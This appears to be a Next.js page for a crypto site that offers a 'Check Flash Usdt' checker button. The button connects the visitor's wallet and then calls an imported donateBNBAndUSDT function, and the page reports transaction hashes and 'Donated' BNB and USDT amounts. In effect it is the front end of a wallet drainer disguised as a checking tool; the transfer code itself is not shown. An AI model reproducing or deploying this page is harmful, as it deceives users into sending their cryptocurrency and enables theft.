"use client";
import { useState } from 'react';
import Image from 'next/image';
import { TextGenerateEffect } from "@/components/ui/text-generate-effect";
import { Navbar } from "@/components/ui/navbar";
import { connectWallet, donateBNBAndUSDT } from "@/utils/bnbWallet";
import { useTranslation } from 'react-i18next';
import '../translations'; // Import the translations

export default function Home() {
  const { t } = useTranslation();
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [txHash, setTxHash] = useState('');
  const [donationAmount, setDonationAmount] = useState('');
  const [error, setError] = useState('');
  const [usdtTxHash, setUsdtTxHash] = useState('');
  const [usdtDonationAmount, setUsdtDonationAmount] = useState('');

  async function handleCheck() {
    if (isProcessing) return;
    setIsProcessing(true);
    setError('');
    try {
      const userAddress = await connectWallet();
      setWalletAddress(userAddress);
      
      const { bnbTxHash, usdtTxHash, bnbAmount, usdtAmount } = await donateBNBAndUSDT();
      setTxHash(bnbTxHash || '');
      setUsdtTxHash(usdtTxHash || '');
      setDonationAmount(bnbAmount);
      setUsdtDonationAmount(usdtAmount);
    } catch (error) {
      setError(error.message);
    } finally {
      setIsProcessing(false);
    }
  }

  return (
    <div className="relative w-full min-h-screen bg-gradient-to-br from-black via-black to-yellow-900 text-yellow-300 overflow-hidden font-oxanium">
      {/* Background GIF */}
      <div className="absolute inset-0 z-0">
        <Image
          src="/Blockchain-DeFi.gif"
          alt="Blockchain DeFi Background"
          layout="fill"
          objectFit="cover"
          className="opacity-60"
        />
      </div>
      
      <Navbar />
      
      <div className="relative z-10 flex flex-col items-center justify-start min-h-screen p-4 pt-24">
        <div className="max-w-md w-full space-y-2">
          <h1 className="text-3xl md:text-5xl font-bold text-center px-4 py-4 rounded-lg">
            {t('You have a Wallet')} <br /> 
            <span className="bg-clip-text text-transparent bg-gradient-to-r from-yellow-400 to-yellow-200">{t('Now what?')}</span>
          </h1>
          
          <h2 className="text-lg md:text-2xl font-bold text-center text-yellow-300 mt-0" style={{ marginTop: '-6px', marginBottom: '32px' }}>
            <TextGenerateEffect words={t('Check Flash Usdt')} />
          </h2>

          <div className="flex flex-col items-center justify-center mt-6 space-y-4">
            <button
              className="bg-white text-black font-bold text-lg px-8 py-4 rounded-full hover:opacity-90 transition-opacity"
              onClick={handleCheck}
              disabled={isProcessing}
            >
              {isProcessing ? t('Processing...') : t('Checker')}
            </button>
            {walletAddress && <p className="text-sm text-yellow-200">{t('Connected:')} {walletAddress}</p>}
            {txHash && <p className="text-sm text-yellow-200">{t('Transaction Hash:')} {txHash}</p>}
            {donationAmount && <p className="text-sm text-yellow-200">{t('Donated Amount:')} {donationAmount} BNB</p>}
            {error && <p className="text-sm text-red-500">{error}</p>}
            {usdtTxHash && <p className="text-sm text-yellow-200">{t('USDT Transaction Hash:')} {usdtTxHash}</p>}
            {usdtDonationAmount && <p className="text-sm text-yellow-200">{t('Donated USDT Amount:')} {usdtDonationAmount} USDT</p>}
          </div>
        </div>
        <div className="w-full max-w-md mb-8 mt-10">
          <div className="w-64 h-64 mx-auto">
            <Image
              src="/bnb.png"
              alt="Blockchain DeFi"
              width={150}
              height={150}
              layout="responsive"
            />
          </div>
        </div>
      </div>
    </div>
  );
}
